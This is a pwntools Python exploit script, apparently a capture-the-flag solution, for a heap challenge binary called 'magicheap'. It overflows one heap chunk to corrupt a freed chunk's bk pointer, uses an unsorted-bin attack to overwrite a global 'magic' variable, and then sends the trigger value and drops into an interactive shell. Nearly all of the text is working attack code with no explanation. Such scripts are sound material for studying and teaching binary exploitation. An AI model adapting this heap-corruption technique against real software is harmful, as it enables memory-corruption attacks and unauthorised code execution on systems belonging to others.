#coding:utf8
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./magicheap"
# libc_binary = "./"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
# libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("Your choice :",str(idx))

def add(length,content):
    opt(1)
    p.sendlineafter("Size of Heap : ",str(length))
    p.sendlineafter("Content of heap:",str(content))

def free(idx):
    opt(3)
    p.sendlineafter("Index :",str(idx))

def edit(idx,length,content):
    opt(2)
    p.sendlineafter("Index :",str(idx))
    p.sendlineafter("Size of Heap : ",str(length))
    p.sendlineafter("Content of heap : ",str(content))


add(0x20,"aaaa")
add(0x80,"aaaa")
add(0x20,"aaaa")
free(1) # unsorted bin
magic = 0x6020c0

fd = 0
bk = magic - 0x10
payload = flat([
    "a"*0x20,
    0,0x91,
    fd,bk
    ])

edit(0,len(payload),payload)

gdb.attach(p,"set $h=0x603000")
add(0x80,"aaaa")
p.sendline("4869")

p.interactive()
